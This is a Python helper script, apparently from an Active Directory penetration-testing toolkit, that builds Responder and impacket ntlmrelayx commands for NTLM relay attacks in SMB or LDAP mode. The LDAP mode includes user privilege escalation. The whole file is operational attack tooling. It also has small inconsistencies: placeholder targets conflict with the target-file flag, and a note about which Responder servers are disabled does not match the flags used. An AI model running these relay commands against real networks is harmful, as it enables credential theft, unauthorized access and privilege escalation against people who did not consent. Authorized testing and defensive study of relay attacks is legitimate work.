#!/usr/bin/env python3
"""Build ready-to-run Responder and ntlmrelayx commands for NTLM relay setup.

Usage:
  python skills/adscan/scripts/relay_setup.py --target-file ./targets.txt --interface eth0 --mode smb
  python skills/adscan/scripts/relay_setup.py --target-file ./targets.txt --interface eth0 --mode ldap
"""

from __future__ import annotations

import argparse
import json
import shutil
import sys

RESPONDER_DISABLE_FLAGS = ["-w", "Off", "-d", "Off", "-f", "Off"]


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Responder + ntlmrelayx command builder."
    )
    parser.add_argument(
        "--target-file",
        required=True,
        help="File listing relay targets (one IP per line)",
    )
    parser.add_argument(
        "--interface", required=True, help="Network interface for Responder (e.g. eth0)"
    )
    parser.add_argument(
        "--mode",
        required=True,
        choices=("smb", "ldap"),
        help="Relay mode: smb or ldap",
    )
    return parser.parse_args()


def build_responder_command(interface: str, responder_bin: str) -> list[str]:
    return [responder_bin, "-I", interface, "-Pv"] + RESPONDER_DISABLE_FLAGS


def build_relay_command(target_file: str, mode: str, relay_bin: str) -> list[str]:
    cmd = [relay_bin, "-tf", target_file, "-smb2support"]
    if mode == "smb":
        cmd += ["-t", "smb://TARGETS", "--no-http-server"]
    elif mode == "ldap":
        cmd += [
            "-t",
            "ldap://TARGETS",
            "--no-http-server",
            "--escalate-user",
            "CHANGE_ME",
        ]
    return cmd


def main() -> int:
    args = parse_args()

    responder_bin = shutil.which("Responder.py") or shutil.which("responder")
    relay_bin = (
        shutil.which("impacket-ntlmrelayx")
        or shutil.which("ntlmrelayx.py")
        or shutil.which("ntlmrelayx")
    )

    responder_cmd = build_responder_command(
        args.interface, responder_bin or "Responder.py"
    )
    relay_cmd = build_relay_command(
        args.target_file, args.mode, relay_bin or "impacket-ntlmrelayx"
    )

    payload: dict[str, object] = {
        "responder": {
            "tool": responder_bin or "Responder.py",
            "tool_found": bool(responder_bin),
            "command": responder_cmd,
            "note": "Run in terminal 1. SMB/HTTP must be Off to avoid capturing instead of relaying.",
        },
        "ntlmrelayx": {
            "tool": relay_bin or "impacket-ntlmrelayx",
            "tool_found": bool(relay_bin),
            "command": relay_cmd,
            "mode": args.mode,
            "target_file": args.target_file,
            "note": (
                "Run in terminal 2. Replace TARGETS placeholder in -t flag with an actual host "
                "or remove it if using -tf only. For ldap mode replace CHANGE_ME with target user."
            ),
        },
        "interface": args.interface,
        "mode": args.mode,
    }

    if not responder_bin:
        print("[!] Responder.py not found on PATH.", file=sys.stderr)
    if not relay_bin:
        print("[!] impacket-ntlmrelayx not found on PATH.", file=sys.stderr)

    print(json.dumps(payload, indent=2, ensure_ascii=True))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
